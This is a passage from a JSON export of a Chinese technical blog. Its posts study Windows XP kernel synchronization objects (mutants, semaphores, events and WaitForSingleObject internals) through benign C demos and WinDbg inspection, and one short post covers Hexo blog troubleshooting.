正常调用时：Mutant._DISPATCHER_HEADER.SignalState++。 如果SignalState=1，说明其它进程可以使用这个互斥体了，此时互斥体会从线程链表（KThread+0x10，MutantListHead指向的那个链表）中移除。这句话不好理解，需要结合代码分析，它可以用来解决 “等待对象被遗弃问题” 。 如何解决重入问题前面提到，重入问题是事件（Event）与信号量（Semaphore）解决不了的，只有互斥体（Mutant）可以解决，这里就简单分析一下解决重入问题的过程。 OwnerThread的作用 回顾互斥体结构_KMUTANT，有一个字段OwnerThread，它就是解决重入的关键。 若一个互斥体被创建时，它的OwnerThread字段不为空，创建它的线程即为互斥体的所属线程。此时，初始化的互斥体SignalState字段被设置为0，也就是没有信号，这个时候别的线程是没法使用这个互斥体的。但是创建它的线程仍然可以使用。并且可以重复使用0x8000000次，这也是为什么互斥体可以重入的原因，因为创建它的线程可以在没有信号的情况下使用互斥体。至于为何创建它的线程在互斥体没有信号的情况下也可以使用，来看下面对KeWaitForSingleObject的分析。 KeWaitForSingleObject分析这个函数可以说是同步系列的核心函数了，事件，信号量，互斥体都会调用它。 首先定位到紫色方框部分，这里是开头，会先判断等待对象类型，若是互斥体，就接着执行；若是信号量或者事件，就跳转。 然后到橙色方框这里，会根据SignalState的值判断是否有信号，如果有信号，就跳转。 如果没有信号，会先到红色方框这里，判断当前线程与互斥体所属线程是否相同。如果相同，就会跳到和有信号时一样的地方。也就是说，即使没有信号，互斥体也可以被它的所属线程使用。这样，对于拥有互斥体的线程，就可以重入该互斥体。那么究竟可以重入多少次呢？接着分析。 跳转后，会先判断SignalState的值是否与0x80000000相等，也就是说，只要不等于0x80000000，就可以继续执行，执行到蓝色方框的时候，会给SignalState的值减去1。这里要分两种情况： SignalState有信号：说明此时SignalState值大于0，任一线程可以等待这个互斥体，且没有重入。 SignalState无信号： 此时的SignalState值为小于等于0，执行到这一步，说明当前线程一定拥有该互斥体，此时SignalState仍会减1，最多可以减少至0x80000000。 结论：由于互斥体进入激活条件有2个（SignalState有信号，线程拥有该互斥体），满足任何一种情况，均可进入激活状态， 从而解决了重入的问题。 如何解决等待对象被遗弃问题接下来是另一个问题，关于如何解决等待对象被遗弃的问题，就像文章开篇提到的情况，当一个线程还没有设置等待对象的信号（例如SetEvent），那么另一个对象就只能一直等待下去了。来看看互斥体是如何解决这个问题的。 互斥体定义了MutantListEntry和Abandoned两个字段，在处理等待对象遗弃的情况时会用到。 当一个线程异常 “死亡” 时，系统会调用内核函数MmUnloadSystemImage处理后事，它会根据 “死亡线程” 0x10位置指向的链表头，找到它所拥有的所有互斥体。将这些互斥体Abandoned字段值设置为1，并对它们调用KeReleaseMutant(X, Y, Abandon, Z)函数（ReleaseMutant的内核函数）。 KeReleaseMutant函数的逻辑如下： 前面提到，正常情况下（Abandon=FALSE），该函数仅对SignalState作加1的操作。如果出现，互斥体所属线程突然死亡的情况（Abandon=TRUE），该函数会将SignalState直接设置为1，并且将互斥体所属线程设置为NULL，同时把自己从死亡线程的互斥体链表中移除。这样互斥体便可再为其它线程所使用，从而解决了等待对象被遗弃问题。 关于禁用内核APC前面的介绍里，互斥体仍有一个字段未被解释清楚，就是最后这个ApcDisable（KMUTANT+0x1d） 互斥体分为2种，一种是用户用的，另一种是内核用的，区别如下： 用户互斥体 结构名：Mutant（在3环被创建） 对应内核函数：NtCreateMutant ApcDisable：0 内核互斥体 结构名：Mutex（在0环被创建） 对应内核函数：NtCreateMutex ApcDisable：1 用户互斥体与内核互斥体结构名不同，但是结构体相同，主要的区别在于ApcDisable字段。用户互斥体是允许内核APC执行的，但是内核互斥体是不允许内核APC进行执行的。另一个细节是，互斥体只是一个内核对象，它是如何限制线程的执行（内核APC的执行）的呢？ 在KeWaitForSingleObject中有如上的代码，可以根据ApcDisable的值修改KThread.KernelApcDisable（正在使用互斥体的线程），若ApcDisable值为0，则KernelApcDisable的值不会发生改变。若ApcDisable值为1，则KernelApcDisable的值将会减1，此时KernelApcDisable将会是一个不为0的值，内核APC将会被禁用（根据内核APC执行过程，若KernelApcDisable的值不为0，内核APC将会被禁用）。 参考资料参考教程： 海哥中级预习班教程 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83473993 （CSDN-My classmates学习笔记） https://blog.csdn.net/qq_41988448/article/details/104895544 （CSDN-lzyddf学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"信号量","slug":"信号量","date":"2020-08-16T14:01:34.000Z","updated":"2022-05-17T15:20:58.747Z","comments":true,"path":"2020/08/16/信号量/","link":"","permalink":"http://cata1oc.github.io/2020/08/16/%E4%BF%A1%E5%8F%B7%E9%87%8F/","excerpt":"","text":"前言前一篇学习了事件（Event）对象，线程在进入临界区之前会通过调用WaitForSingleObject或者WaitForMultipleObjects来判断当前的事件对象是否有信号（SignalState>0），只有当事件对象有信号时，才可以进入临界区。 需要说明的是，这里的临界区指的是广义上的临界区，即只允许一个线程进入直到退出的一段代码，不单指用EnterCriticalSection()和LeaveCriticalSection()而形成的临界区。 通过对Event对象相关函数的分析，我们发现，Event对象的SignalState值只有两种可能： 值为1： CreateEvent函数初始化Event时，第3个参数值为TRUE。 调用SetEvent函数设置Event对象为有信号。 值为0： WaitForSingleObject/WaitForMultipleObjects ResetEvent 事件的应用场景修改全局变量在对事件对象的相关知识有所掌握后，就轮到对其应用场景的学习。事件可以运用在 “当多个线程想要对同一个全局变量作修改时” 的情景，此时可以通过事件（例如WaitForSingleObject+SetEvent）形成的临界区，完成对线程进出临界区的控制，以保证同一时间只有一个线程可以修改全局变量。 生产者与消费者问题生成者与消费者问题是经典的线程同步问题，需要解决的问题是在资源不对等的情况下，该如何确保线程同步。 如图，有1个生产者线程，每回合可以生产出3点资源，此时有5个消费者线程。需要保证在同一时间不会有2个线程消费同1个资源。 在这种情况下，使用事件来控制线程的同步就相当的困难，效率也相对较低： 若使用事件同步对象（Type=1），由于事件对象的SignalState的值只能为0或者1，因此同一时间只有一个消费者线程可以获得资源，此时效率是极其低下的。 若使用通知类型对象（Type=0），通知类型对象唤醒的线程，在进入KeWaitForSingleObject循环后，不会修改SignalState的值，但是此时仅有3点资源，唤醒5个线程，显然也会造成资源的浪费。 综上，在解决的生成者与消费者问题时，使用事件对象来处理，效率明显不够高。需要有另一种形式的同步对象，也就是本篇将要介绍的信号量。 信号量的应用场景信号量和事件大体类似，不同的是，相较于事件对象同一时间仅允许一个线程进入临界区，信号量则允许多个线程同时进入临界区。 因此信号量可以应用在生成者与消费者问题上。当消费者线程的数量多于可被消耗的资源时，允许和资源数量相同的线程进入临界区，即可使得效率最大化。 信号量的创建与设置再次回顾KeWaitForSingleObject的关键循环 之前已重复多次，不同类型的等待对象。区别在于对是否符合激活条件的判断，以及对SignalState值的修改。所以从这两个角度入手，会更容易理解信号量。 信号量的创建下面将信号量创建API，信号量结构体，信号量第一个成员_DISPATCHER_HEADER放在一起看，会比较清晰。 首先是CreateSemaphore函数，比较关键的是第二个和第三个参数。 调用CreateSemaphore函数创建出信号量，也就是_KSEMAPHORE这个结构体。该结构体比Event对象多了一个Limit字段，该字段由CreateSemaphore的第三个参数IMaximumCount决定，用来设置最多允许多少线程同时进入临界区。 _DISPATCHER_HEADER是每个可等待对象都拥有的成员，其中信号量类型为5（Type=5），SignalState的值由CreateSemaphore的第二个参数IInitialCount决定。 信号量的设置之前学习的Event对象，它的SignalState由CreateEvent第三个参数决定，也可以通过SetEvent设置信号。 信号量的SignalState由CreateSemaphore第二个参数IInitialCount决定，也可以通过ReleaseSemaphore设置信号。 根据分析ReleaseSemaphore函数，其执行流程如上图所示，最终会调用内核的KeReleaseSemaphore函数，该函数主要作用也和SetEvent（Type=0）类似，区别也是在于对SignalState的修改上： SetEvent：将SignalState的值置1。 ReleaseSemaphore：设置SignalState = SignalState + N(传入的参数) ReleaseSemaphore函数，在解决生产者消费者问题时就更有效率，它可以根据生产出来的资源设置相应的信号。 KeWaitForSingleObject同样，KeWaitForSingleObject这个函数也是必不可少的，几个主要的可等待对象都要经过它的循环，信号量的部分在上一期顺带提到了，这里可以直接拿来用。 这里直接定位到粉色方框部分，只有当Type值为5时，也就是信号量对象时，才会走这里。这里对SignalState值的修改方式是减1，和事件对象不一样。事件对象是直接将SignalState设置为0，信号量则是减1。这样信号量就可以精准控制进入临界区线程的数量，在解决例如生产者与消费者问题时更有效率。 参考资料参考教程： 海哥中级预习班课程 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83449347 （CSDN-My classmates学习笔记） https://blog.csdn.net/qq_41988448/article/details/104895544 （CSDN-lzyddf学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"hexo博客常见问题（持续更新）","slug":"hexo博客常见问题","date":"2020-08-15T06:16:53.000Z","updated":"2022-05-17T15:20:22.840Z","comments":true,"path":"2020/08/15/hexo博客常见问题/","link":"","permalink":"http://cata1oc.github.io/2020/08/15/hexo%E5%8D%9A%E5%AE%A2%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/","excerpt":"","text":"前言弄这个博客也有一段时间了，早在3月份的时候，刚开始弄博客，花费的心思也比较多。还会稍微布局一下，学习一些模板的使用。但之后便再没花心思。最近写博客的时候，遇到一个问题，很快就解决了，甚至没有查资料。觉得以后也许还会遇到，想着记录下来这些情况总是不会错的，因此从本篇开始，会不定期更新一些遇到的关于hexo博客的问题。如果以后文章积累的太长了，则会选择新增第二篇，并重新排版。 未知标签块引起的错误在前一天熬夜弄博客，晚上注意力不集中，导致了疏忽，在对文章嵌入图片时，少了一个字符，形成未知标签块，导致博客始终无法启动。情况如下： Code12正常嵌入文章图片的格式应为： {% asset_img xxx.png %}而我昨天疏忽导致写成这样： {% asse_img xxx.png %} 此时hexo会无法识别这个标签，导致服务启动失败，情况如下： 修改成功后，便可成功启动服务。 文件被锁住无法上传今天更新时遇到如下图所示情况 这种情况之前在保存文件时也遇到过，因我对该文件夹进行了云备份，所以我操作此文件时，可能百度云正在同步上传，所以此时无法对该文件进行修改。稍等一会，便可以了。","categories":[],"tags":[{"name":"博客","slug":"博客","permalink":"http://cata1oc.github.io/tags/%E5%8D%9A%E5%AE%A2/"}]},{"title":"事件","slug":"事件","date":"2020-08-14T03:52:03.000Z","updated":"2022-05-17T15:19:38.025Z","comments":true,"path":"2020/08/14/事件/","link":"","permalink":"http://cata1oc.github.io/2020/08/14/%E4%BA%8B%E4%BB%B6/","excerpt":"","text":"要点回顾在之前的文章中学习过，线程在进入临界区之前会调用WaitForSingleObject或者WaitForMultipleObjects，此时如果有信号，线程会从函数中退出并进入临界区，如果没有信号那么线程会将自己挂入等待链表，然后将自己挂入等待网，最后切换线程。 其它线程在适当的时候，调用方法修改被等待对象的SignalState为有信号（不同的等待对象，会调用不同的函数），并将等待该对象的其它线程从等待链表中摘掉（临时复活）。这样，当前线程便会在WaitForSingleObject或者WaitForMultipleObjects恢复执行（在哪切换在哪开始执行），如果符合唤醒条件，此时会修改SignalState的值，并将自己从等待网上摘下来，此时的线程才是真正的唤醒。 唤醒方式的差异被等待对象的不同，在唤醒的过程中也会有所差异。再回顾这个循环。 不同的被等待对象，主要差异体现在两点： 循环开始时，判断是否符合激活条件的方式不同。 符合激活条件的情况下，修改SignalState的具体操作不同。 创建事件对象：信号分析本篇主要讨论事件这个可等待对象与线程唤醒机制的关联。首先是创建事件对象API： c123456HANDLE CreateEvent( LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, //决定_DISPATCHER_HEADER.Type BOOL bInitialState, //决定_DISPATCHER_HEADER.SignalState LPCTSTR lpName); 事件仅有一个_DISPATCHER_HEADER结构，作为可等待对象最重要的一个结构，把它和事件放到一起来看。 c12345678_DISPATCHER_HEADER +0x000 Type //CreateEvent的第二个参数决定了当前事件对象的类型 //TRUE：通知类型对象 FALSE：事件同步对象 +0x001 Absolute +0x002 Size +0x003 Inserted +0x004 SignalState //CreateEvent的第三个参数决定了这里是否有值 +0x008 WaitListHead 在创建事件对象时，CreateEvent的第二个和第三个参数分别决定了_DISPATCHER_HEADER的Type和SignalState的值。这里用一个实验验证对SignalState影响。 编写并运行如下代码（环境：Windows XP，IDE：VC++6.0） c12345678910111213141516171819202122232425262728#include \"stdafx.h\"#include HANDLE g_hEvent;DWORD WINAPI ThreadProc(LPVOID lpParameter){ //当事件变成已通知时 WaitForSingleObject(g_hEvent, INFINITE); printf(\"Thread执行了!\\n\"); return 0;}int main(){ //创建事件 //默认安全属性 对象类型 初始状态 名字 g_hEvent = CreateEvent(NULL, FALSE, FALSE, NULL); //设置为有信号 //SetEvent(g_hEvent); //创建线程 ::CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); getchar(); return 0;} 观察运行结果 无任何输出，g_hEvent句柄处于无信号状态。 修改代码并重新执行 c1g_hEvent = CreateEvent(NULL, FALSE, TRUE, NULL); //第三个参数由FALSE改为TRUE 再次观察结果 发现打印出了结果。 接着继续修改代码。 c12g_hEvent = CreateEvent(NULL, FALSE, TRUE, NULL); //第三个参数再次改回FALSESetEvent(g_hEvent); //设置信号量，将原先注释掉的语句添加回来 观察修改后的结果 结论 CreateEvent函数的第三个参数决定了事件对象一开始是否有信号。 CreateEvent函数第三个参数为TRUE时，效果等同于在下一行调用了SetEvent()。 创建事件对象：类型前面提到CreateEvent的第二个和第三个参数分别决定了_DISPATCHER_HEADER的Type和SignalState的值，这部分验证第二个参数对Type值的影响以及Event对象两种类型（0、1）的介绍。 分析 编写并运行如下代码（环境：Windows XP，IDE：VC++6.0） c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include \"stdafx.h\"#include HANDLE g_hEvent;DWORD WINAPI ThreadProc1(LPVOID lpParameter){ WaitForSingleObject(g_hEvent, INFINITE); printf(\"Thread1执行了!\\n\"); return 0;}DWORD WINAPI ThreadProc2(LPVOID lpParameter){ WaitForSingleObject(g_hEvent, INFINITE); printf(\"Thread2执行了!\\n\"); return 0;}DWORD WINAPI ThreadProc3(LPVOID lpParameter){ WaitForSingleObject(g_hEvent, INFINITE); printf(\"Thread3执行了!\\n\"); return 0;}int main(){ //创建事件 //默认安全属性 对象类型 初始状态 名字 g_hEvent = CreateEvent(NULL, FALSE, FALSE, NULL); HANDLE hThread[3]; //创建3个线程 hThread[0] = ::CreateThread(NULL, 0, ThreadProc1, NULL, 0, NULL); hThread[1] = ::CreateThread(NULL, 0, ThreadProc2, NULL, 0, NULL); hThread[2] = ::CreateThread(NULL, 0, ThreadProc3, NULL, 0, NULL); //设置事件为已通知 SetEvent(g_hEvent); //等待线程结束 销毁内核对象 WaitForMultipleObjects(3, hThread, TRUE, INFINITE); CloseHandle(hThread[0]); CloseHandle(hThread[1]); CloseHandle(hThread[2]); CloseHandle(g_hEvent); getchar(); return 0;} 观察运行结果 可以看出，在CreateEvent函数第二个参数值为FALSE时，Event的类型是1。此时经过SetEvent设置事件信号后，仅仅有一个线程执行了。 这种类型的Event，属于事件同步对象（Type=1），当其它线程调用SetEvent函数时，会根据WaitListHead找到第一个，且只需要一个等待对象符合条件就可以被激活的线程（即_KWAIT_BLOCK.WaitType=1），将其临时复活。接着被临时复活的线程若能成功退出循环，便将自己从等待网摘除，完成执行。 接下来修改代码，重新编译、执行 c1g_hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); //第二个参数由FALSE改为TRUE 观察结果 此时，在CreateEvent函数第二个参数值为TRUE时，Event的类型是0（因线程均已复活，所以此时无法查看被等待对象）。此时经过SetEvent设置事件信号后，所有线程都执行了。 这种类型的Event，属于通知类型对象（Type=0），特点就是，其它线程调用SetEvent函数时，会根据Event对象的WaitListHead找到所有等待该对象的线程，将它们临时复活。 结论SetEvent对应的内核函数：KeSetEvent 修改信号量SignalState为1 判断对象类型 如果类型为通知类型对象（Type=0），唤醒所有等待该状态的线程。 如果类型为事件同步对象（Type=1），从链表头找到第一个等待类型为WaitAny（_KWAIT_BLOCK.WaitType=1）的线程。 KeWaitForSingleObject分析到这里还有一个问题没有解决，就是通知类型对象仅仅是被临时复活，为什么却能全部得到执行呢？要解开这个问题，需要分析KeWaitForSingleObject的关键循环。 分析 在对Event部分分析过后，这里对这个循环的逻辑进行梳理： 首先，KeWaitForSingleObject函数的参数包含了被等待对象的地址，就是Object参数，红色方框可以看到，被等待对象的首地址，也就是_DISPATCHER_HEADER的首地址，被传给了ebx。 往下看，橙色方框里会判断被等待对象的类型（_DISPATCHER_HEADER.Type）是否为2（互斥体），互斥体的情况比较特殊，会单独处理；其余情况则会跳转。 若不是互斥体，跳转到蓝色方框，这里会先判断被等待对象的SignalState的值是否为0，即是否有信号。若无信号，则跳走。 接下来到紫色方框部分，这里会判断Type的类型是否为1，若为1，说明是事件同步对象，此时会跳转到上方的代码块，将SignalState的值置0，之后退出循环。 再到绿色方框，这里会判断类型是否为5（信号量Semaphore的Type值为5），若为5，则会跳转到粉色方框，将SignalState的值减1，之后退出循环 若不为5，只有可能是通知类型对象，此时不作任何修改，退出循环。 通过分析，可以解决之前的疑惑，通知类型对象在符合激活条件的情况下，是不会对SignalState的值进行修改的，因此所有临时复活的线程都能完成执行。 结论 通知类型对象（Type=0），不修改SignalState 事件同步对象（Type=1），SignalState置0 信号量（Type=5），SignalState减1 参考资料参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/qq_41988448/article/details/104895544 （CSDN-lzyddf学习笔记） https://blog.csdn.net/weixin_42052102/article/details/83421697 （CSDN-My classmates学习笔记） https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-kewaitforsingleobject （KeWaitForSingleObject）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"WaitForSingleObject函数分析","slug":"WaitForSingleObject函数分析","date":"2020-08-13T03:49:28.000Z","updated":"2022-05-17T15:18:52.326Z","comments":true,"path":"2020/08/13/WaitForSingleObject函数分析/","link":"","permalink":"http://cata1oc.github.io/2020/08/13/WaitForSingleObject%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/","excerpt":"","text":"前言前一篇文章学习了线程等待与唤醒机制。了解到无论可等待对象是何种类型，线程都是通过调用函数WaitForSingleObject或WaitForMultipleObjects进入等待状态的，这两个函数是理解线程等待与唤醒机制的核心。本篇以WaitForSingleObject为例，从函数执行流程的角度，分析线程进入等待状态，形成等待网的过程。 WaitForSingleObject函数原型如下： c123DWORD WaitForSingleObject( HANDLE hHandle, //(内核)对象句柄 DWORD dwMilliseconds //定时时间间隔 WaitForSingleObject是3环函数，它不会完成什么功能，仅会根据系统服务号，去内核寻找对应的内核函数（NtWaitForSingleObject）。这里唯一需要注意的是hHandle，这是一个句柄，在句柄表一篇中提到过，句柄相当于内核对象的一个编号，通过这个编号可以获取到对应内核对象的地址。 NtWaitForSingleObjectWaitForSingleObject不会执行函数功能，会调用下一步需要执行的内核函数NtWaitForSingleObject，先来看函数原型： c123456NTSTATUS __stdcall NtWaitForSingleObject( HANDLE Handle, //用户层传递的等待对象的句柄(具体细节参加句柄表专题) BOOLEAN Alertable, //对应KTHREAD结构体的Alertable属性 //如果值为1，在插入用户APC时，该线程将被吵醒 PLARGE_INTEGER Timeout //超时时间);) 这个NtWaitForSingleObject函数它只做了两件事： 调用ObReferenceObjectByHandle函数，通过对象句柄找到等待对象结构体地址。 调用KeWaitForSingleObject函数，进入关键循环。 结论，这个NtWaitForSingleObject也没有实现线程等待功能，关键的函数是KeWaitForSingleObject。 KeWaitForSingleObject函数原型如下： c1234567NTSTATUS KeWaitForSingleObject ( PVOID Object, KWAIT_REASON WaitReason, KPROCESSOR_MODE WaitMode, BOOLEAN Alertable, PLARGE_INTEGER Timeout); 由于KeWaitForSingleObject函数内部实现非常复杂，这里就先不逆向分析该函数，采用海哥逆向的结论，并完成验证。 上半部分 向_KTHREAD(+0x70)位置的等待块赋值。 如果超时时间不为0，_KTHREAD(+0x70)第四个等待块将与第一个等待块关联起来：第一个等待块指向第四个等待块，第四个等待块指向第一个等待块。 KTHREAD(+0x5C)指向第一个_KWAIT_BLOCK。 进入关键循环。 这里有两个要素，一个是等待块，一个是超时时间。先说等待块。 在KTHREAD(+0x70)处刚好有一个长度为4的_KWAIT_BLOCK数组，这个数组和等待块的结构体相同，因此当线程等待的对象等于或小于3个时，就会先占用这里的等待块，第4个等待块是给定时器用的。如果有4个等待对象就不会用这个位置了，它会一次性分配新的空间。下面来对此结论进行验证： 编译并运行如下代码（环境：Windows XP，Visual C++ 6.0） c12345678910111213141516171819202122#include \"stdafx.h\"#include \"windows.h\" HANDLE hEvent[2];DWORD WINAPI ThreadProc(LPVOID lpParameter){ ::WaitForSingleObject(hEvent[0], -1); printf(\"ThreadProc函数执行...\\n\"); return 0;}int main(int argc, char* argv[]){ hEvent[0] = ::CreateEvent(NULL, TRUE, FALSE, NULL); ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc, NULL, 0, NULL); getchar(); return 0;} 在Windbg中找到相应线程 可以发现KTHREAD(+0x5C)处所指的等待块，刚好就是KTHREAD(+0x70)的位置（81c353e0+0x70=81c35450） 代码中只等待了一个事件，所以会使用_KTHREAD(+0x70) 可以看到，第二个和第三个等待块也都是空的，第四个等待块给了定时器用。 上面的部分，主要解决的是等待块分配的问题，最关键的核心算法，在于下面的循环。 关键循环关键循环的逻辑大致如下 c123456789101112131415161718192021while(true) //每次线程被其他线程唤醒,都要进入这个循环 { if(符合激活条件) //1超时 2等待对象SignalState > 0 { //1修改SignalState //2退出循环 } else //SignalState不大于0 也没超时 { if(第一次执行) { //将当前线程的等待块挂到等待对象的链表 (WaitListHead) 中; //将自己挂入等待链表(KiaitListHead) //切换线程...再次获得CPU时，从这里开始执行 } } }1)线程将自己+5c位置清02)释放_KWAIT_BLOCK所占内存 想要弄清这个循环的逻辑，需要弄明白SignalState这个参数的含义。先看一下_DISPATCHER_HEADER结构： c12345678910kd> dt _DISPATCHER_HEADERnt!_DISPATCHER_HEADER +0x000 Type //类型码：表明该对象类型(例如Event对象有两种类型，0和1) //可通过IDA分析代码查看可等待对象的类型码 //或者Wait一个对象，用WinDbg查看 +0x001 Absolute +0x002 Size +0x003 Inserted +0x004 SignalState //是否有信号(值大于0就是有信号) +0x008 WaitListHead //双向链表头，链着所有等待块(此链表包含了所有正在等待该同步对象的线程) 在线程等待与唤醒中学习过，可等待对象的特征就是其结构的第一个成员，或者其结构内部包含_DISPATCHER_HEADER结构。 现在开始理清循环的逻辑： 进入循环，判断当前被等待对象（例如Event）是否有信号（判断_DISPATCHER_HEADER.SignalState的值） 如果符合激活条件（超时、SignalState>0）： 修改SignalState：这里不一定是清零，因为每种类型修改的方式不一样。 退出循环。 如果不符合激活条件： 如果是第一次执行： 将当前线程的等待块挂到等待对象的链表（_DISPATCHER_HEADER.WaitListHead）中。此时进入了等待网。 将自己挂入等待链表（KiWaitListHead），等待链表的内容可以参考之前的一篇文章。当线程自己把自己挂入等待链表以后，就相当于交付出去CPU控制权，并进行线程切换。此时循环才执行到一半，并未执行完，自己就被切换出去了。 当线程将自己挂入等待队列后，需要等待另一个线程将自己唤醒（设置等待对象信号SignalState>0），此时这个线程会根据其设置的等待对象WaitListHead链着的等待块，给所有等待块的所属线程一次临时复活的机会。这个临时复活意思是将这些线程从KiWaitListHead上面摘下来，也就是从等待链表上摘下来，但是，依旧挂在等待网上，所以被称作临时复活。 复活的线程里，第一个获取到CPU控制权的，从此处，也就是自己把自己挂入等待链表（KiWaitListHead）后的位置，继续执行。并重新进入循环的入口。 如果退出循环了，会执行到这里。这里简单讨论一下，临时复活的线程，如何完全复活。临时复活的线程，会接着执行并重新进入循环，如果它只有一个等待块，那么这个线程会符合激活条件，并退出循环。但又因为它退出循环之前，修改了SignalState的值，导致后面获得CPU控制权的不符合激活条件，并将重新挂到KiWaitListHead等待链表上。如果它有多个等待块，在判断第二个等待块时，也会因为不符合激活条件，也要重新将自己挂到KiWaitListHead上。也就是说，只有第一个获得CPU控制权，且只有一个等待块的线程，才能完全复活，别的临时复活的线程，要重新挂到等待链表上。 执行到这里，已经退出循环了，线程会将自己+5C的位置清0，释放_KWAIT_BLOCK所占内存，将自己从等待网上摘除，成功复活。 总结不同的等待对象，用不同的方法来修改_DISPATCHER_HEADER.SignalState。比如：如果可等待对象是EVENT,其他线程通常使用SetEvent来设置SignalState = 1；并且，将正在等待该对象的其他线程唤醒，也就是从等待链表(KiWaitListHead)中摘出来。但是，SetEvent函数并不会将线程从等待网上摘下来，是否要下来，由当前线程自己来决定。 关于强制唤醒在APC专题中讲过，当我们插入一个用户APC时(Alertable=1)，当前线程是可以被唤醒的，但并不是真正的唤醒。因为，如果当前的线程在等待网上，执行完用户APC后，仍然要进入等待状态。 参考资料参考教程： 海哥内核中级预习班 参考链接： https://blog.csdn.net/qq_41988448/article/details/104650212 （CSDN-lzyddf学习笔记） https://blog.csdn.net/weixin_42052102/article/details/83419566 （CSDN-My classmates学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"线程等待与唤醒","slug":"线程等待与唤醒","date":"2020-08-12T07:05:38.000Z","updated":"2022-05-17T15:18:17.600Z","comments":true,"path":"2020/08/12/线程等待与唤醒/","link":"","permalink":"http://cata1oc.github.io/2020/08/12/%E7%BA%BF%E7%A8%8B%E7%AD%89%E5%BE%85%E4%B8%8E%E5%94%A4%E9%86%92/","excerpt":"","text":"前言前面学习了如何自己实现临界区以及什么是Windows自旋锁，这两种同步方案在线程无法进入临界区时都会让当前线程进入等待状态，一种是通过Sleep函数实现的，一种是通过让当前的CPU“空转”实现的，但这两种等待方式都有局限性： 通过Sleep函数进行等待，等待时间该如何确定？ 通过“空转”的方式进行等待，只有等待时间很短的情况下才有意义，否则对CPU资源是种浪费。而且自旋锁只能在多核的环境下才有意义。 基于以上的局限性，本篇将学习一种更加合理的等待唤醒机制。 等待唤醒机制基本概念在Windows中，一个线程可以通过等待一个或者多个可等待对象，从而进入等待状态，另一个线程可以在某些时刻唤醒等待这些对象的其他线程。 如上图，A线程用WaitForSingleObject进入等待状态，B线程用SetEvent将线程唤醒，A线程与B线程便可以通过可等待对象联系到一起。 可等待对象那什么是可等待对象呢？在Windbg中查看如下结构体 Code1234567进程 dt _KPROCESS线程 dt _KTHREAD定时器 dt _KTIMER信号量 dt _KSEMAPHOREI事件 dt _KEVENT互斥体 dt _KMUTANT文件 dt _FILE_OBJECT 以KEVENT为例 他们的第一个成员（文件除外）都是一个结构体：_DISPATCHER_HEADER。 当然，个别结构体不是，例如文件结构体_FILE_OBJECT 尽管不是第一个成员，但文件结构体中也依然包含_DISPATCHER_HEADER。 小结 线程与等待对象在了解了线程可以通过等待对象建立起联系之后，这里进一步学习这种关系建立起来的内部细节。 一个线程等待一个对象先从比较简单的一个线程等待一个对象的情形开始： 编译并运行如下代码（环境：Windows XP，Visual C++ 6.0） c12345678910111213141516171819202122#include \"stdafx.h\"#include HANDLE hEvent[2];DWORD WINAPI ThreadProc(LPVOID lpParameter){ ::WaitForSingleObject(hEvent[0], -1); printf(\"ThreadProc函数执行...\\n\"); return 0;}int main(int argc, char* argv[]){ hEvent[0] = ::CreateEvent(NULL, TRUE, FALSE, NULL); ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc, NULL, 0, NULL); getchar(); return 0;} 在WinDbg中找到该进程，并查看其内容，指令如下： Code12kd>!process 0 0 //找到进程结构体的地址kd>!process 0x???????? //根据进程结构体的地址查看其内容，并找到其线程结构体的地址 根据进程内容，访问其所包含线程（KThread） 这里需要关注的是位于KThread+0x5C处的WaitBlockList等待块，这是一个_KWAIT_BLOCK结构，这个等待块将线程与被等待对象联系到了一起。 下面来看看这个等待块结构是怎样的。 WaitListEntry：稍后作分析。 Thread：当前线程。 Object：被等待对象的地址（本次实验中是一个Event）。 NextWaitBlock：单向循环链表，存的是与当前线程关联的多个等待块结构体。例如。当前线程只有一个等待对象时，该值指向自己。若存在n个等待对象，则1->2, 2->3 … n->1（单循环链表）。 WaitKey：等待块索引，表明当前是第几个等待块。 WaitType：等待类型。若只要有一个等待对象符合条件就可以被激活那么它的值就是1， 如果如果你等待多个对象必须全部符合条件才可以被激活它就是0。 一个线程等待一个对象的情况，可以用下图表示。 一个线程等待多个对象接着来看一个线程等待多个对象的情况： 编译并运行如下代码（环境：Windows XP，Visual C++ 6.0） c1234567891011121314151617181920212223#include \"stdafx.h\"#include HANDLE hEvent[2];DWORD WINAPI ThreadProc(LPVOID lpParameter){ ::WaitForMultipleObjects(2, hEvent, FALSE, -1); printf(\"ThreadProc函数执行...\\n\"); return 0;}int main(int argc, char* argv[]){ hEvent[0] = ::CreateEvent(NULL, TRUE, FALSE, NULL); hEvent[1] = ::CreateEvent(NULL, TRUE, FALSE, NULL); ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc, NULL, 0, NULL); getchar(); return 0;} 这次创建了2个事件，并在调用线程回调函数时让它们进入等待状态，运行后，进入WinDbg查看细节。 还是跟之前一样，先找到线程，然后在线程结构体0x5C的位置，找到相应的等待块。 接下来观察等待块 由图，这次第一个等待块的NextWaitBlock指向的不是自己，而是下一个等待块。下一个等待块的NextWaitBlock指向了第一个等待块的地址。这里验证了一个线程等待多个可等待对象时，NextWaitBlock字段的作用。另一处，可以看到WaitKey字段也有相应的值。 前面说了这么多，依旧有一个字段没有解释，就是这个WaitListEntry这个字段，观察下图 